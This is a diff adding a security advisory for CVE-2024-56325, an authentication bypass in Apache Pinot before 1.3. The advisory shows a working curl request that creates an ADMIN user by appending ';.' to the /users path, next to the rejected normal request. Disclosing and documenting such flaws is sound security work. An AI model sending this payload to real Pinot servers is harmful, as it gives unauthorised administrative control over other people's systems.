@@ -88,3 +88,30 @@ _Last updated: 2024-07-24T07:41:07.886Z_
 
 ### Credits
 * Xun Bai <bbbbear68@gmail.com> (finder)
+
+
+## Authentication bypass issue. If the path does not contain / and contain . authentication is not required ## { #CVE-2024-56325 }
+
+CVE-2024-56325 [\[CVE json\]](./CVE-2024-56325.cve.json) [\[OSV json\]](./CVE-2024-56325.osv.json)
+
+
+
+_Last updated: 2025-07-11T10:32:57.135Z_
+
+### Affected
+
+* Apache Pinot before 1.3
+
+
+### Description
+
+<b>Authentication Bypass Issue</b><br><br><span style="background-color: rgba(29, 28, 29, 0.04);">If the path does not contain / and contain., authentication is not required.<br><br><b>Expected Normal Request and Response Example</b><br><br><span style="background-color: rgba(29, 28, 29, 0.04);">curl -X POST -H "Content-Type: application/json" -d {\"username\":\"hack2\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"} <a target="_blank" rel="nofollow" href="http://{server_ip}:9000/users">http://{server_ip}:9000/users</a><br><br>
+Return: {"code":401,"error":"HTTP 401 Unauthorized"}</span><br><br><br><b>Malicious Request and Response Example</b> <br><br>curl -X POST -H "Content-Type: application/json" -d '{\"username\":\"hack\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}'<b> </b><a target="_blank" rel="nofollow" href="http://{serverip}:9000/users;"><b>http://{serverip}:9000/users;</b></a><b>.</b><br><br>
+Return: {"users":{}}
+<br><br>
+ 
+
+A new user gets added bypassing authentication, enabling the user to control Pinot.</span><br><br>
+
+### References
+* https://lists.apache.org/thread/ksf8qsndr1h66otkbjz2wrzsbw992r8v
